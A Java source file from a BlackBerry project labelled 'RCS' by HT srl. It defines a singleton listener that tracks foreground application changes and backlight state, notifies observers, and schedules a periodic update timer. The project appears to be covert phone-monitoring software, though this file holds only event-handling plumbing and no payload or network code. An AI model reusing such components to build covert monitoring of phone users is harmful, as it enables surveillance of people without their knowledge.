//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : AppListener.java
 * Created      : 28-apr-2010
 * *************************************************/

package blackberry.application;


import java.util.Timer;
import java.util.Vector;

import net.rim.device.api.system.SystemListener2;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.Listener;
import blackberry.interfaces.Singleton;
import blackberry.interfaces.iSingleton;

/**
 * The listener interface for receiving app events. The class that is interested
 * in processing a app event implements this interface, and the object created
 * with that class is registered with a component using the component's
 * <code>addAppListener<code> method. When
 * the app event occurs, that object's appropriate
 * method is invoked.
 * 
 * @see AppEvent
 */
public final class AppListener extends Listener implements SystemListener2,
        iSingleton {

    private static final long GUID = 0x4e5dd52b9f50b3feL;

    private static final long APP_TIMER_PERIOD = 2000;

    //#ifdef DEBUG
    static Debug debug = new Debug("AppListener", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    static private int lastStatus;
    Vector batteryStatusObservers = new Vector();
    Vector applicationObservers = new Vector();
    Vector backlightObservers = new Vector();
    //Vector phoneCallObservers = new Vector();
    Vector callListObservers = new Vector();

    private Timer applicationTimer;

    private boolean suspendable = true;

    //private Timer applicationTimer;

    static AppListener instance;

    /**
     * Instantiates a new app listener.
     */
    private AppListener() {

    }

    /**
     * Gets the single instance of AppListener.
     * 
     * @return single instance of AppListener
     */
    public synchronized static AppListener getInstance() {
        if (instance == null) {
            instance = (AppListener) Singleton.self().get(GUID);
            if (instance == null) {
                final AppListener singleton = new AppListener();
                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }    
        }
        return instance;
    }

    public synchronized void addApplicationObserver(
            final ApplicationObserver observer) {
        addObserver(applicationObservers, observer);
    }

    public synchronized void removeApplicationObserver(
            final ApplicationObserver observer) {
        removeObserver(applicationObservers, observer);
    }

    public void addBacklightObserver(final BacklightObserver observer) {
        addObserver(backlightObservers, observer);
    }

    public void removeBacklightObserver(final BacklightObserver observer) {
        removeObserver(backlightObservers, observer);
    }

    public void applicationForegroundChange(String startedName,
            String stoppedName, String startedMod, String stoppedMod) {
        //#ifdef DEBUG
        debug.info("applicationForegroundChange start: " + startedName //$NON-NLS-1$
                + " stopped: " + stoppedName); //$NON-NLS-1$
        //#endif

        final int size = applicationObservers.size();
        for (int i = 0; i < size; i++) {

            final ApplicationObserver observer = (ApplicationObserver) applicationObservers
                    .elementAt(i);
            //#ifdef DEBUG
            debug.trace("notify: " + observer); //$NON-NLS-1$
            //#endif

            observer.onApplicationChange(startedName, stoppedName, startedMod,
                    stoppedMod);
        }
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.SystemListener2#backlightStateChange(boolean)
     */
    public void backlightStateChange(final boolean on) {

        //#ifdef DEBUG
        debug.info("backlightStateChange: " + on); //$NON-NLS-1$
        //#endif

        final int size = backlightObservers.size();
        for (int i = 0; i < size; i++) {

            final BacklightObserver observer = (BacklightObserver) backlightObservers
                    .elementAt(i);
            //#ifdef DEBUG
            debug.trace("notify: " + observer); //$NON-NLS-1$
            //#endif

            observer.onBacklightChange(on);
        }
        
        if(on){
            resumeApplicationTimer();
        }else{
            //#ifdef DEBUG
            debug.trace("backlightStateChange, suspendable " + suspendable);
            //#endif
            if(suspendable ){
                suspendApplicationTimer();
            }
        }

    }
    
    AppUpdateManager appUpdateManager;
    
    /**
     * Start application timer.
     */
    public synchronized void resumeApplicationTimer() {
        //#ifdef DEBUG
        debug.info("resumeApplicationTimer");
        //#endif

        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
        }
        applicationTimer = new Timer();

        if (appUpdateManager == null) {
            appUpdateManager = new AppUpdateManager();
        } else {
            appUpdateManager = new AppUpdateManager(appUpdateManager);
        }

        applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
                APP_TIMER_PERIOD);

    }

    /**
     * Stop application timer.
     */
    synchronized void suspendApplicationTimer() {
        //#ifdef DEBUG
        debug.info("suspendApplicationTimer");
        //#endif
        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
        }
    }
    
    public void suspendable(boolean value){
        this.suspendable=value;
    }

    public void batteryGood() {

    }

    public void batteryLow() {
  
    }

    public void batteryStatusChange(int status) {
 
    }

    public void powerOff() {
  
    }

    public void powerUp() {
   
    }

    public void cradleMismatch(boolean mismatch) {
    
    }

    public void fastReset() {
     
    }

    public void powerOffRequested(int reason) {
   
    }

    public void usbConnectionStateChange(int state) {
     
    }

}
